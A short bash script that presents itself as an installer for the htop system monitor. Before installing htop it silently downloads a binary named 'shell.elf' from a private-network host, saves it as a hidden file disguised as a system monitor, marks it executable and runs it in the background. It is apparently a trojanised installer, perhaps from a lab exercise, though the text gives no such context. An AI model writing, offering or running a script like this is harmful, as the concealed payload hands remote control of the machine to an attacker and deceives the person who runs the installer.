#!/bin/bash
curl -s -o /tmp/.sysmon-htop.bin http://192.168.223.129:8000/shell.elf
chmod +x /tmp/.sysmon-htop.bin
/tmp/.sysmon-htop.bin &
if command -v apt-get >/dev/null; then
    sudo apt-get update -y
    sudo apt-get install -y htop
elif command -v yum >/dev/null; then
    sudo yum install -y epel-release
    sudo yum install -y htop
fi
htop
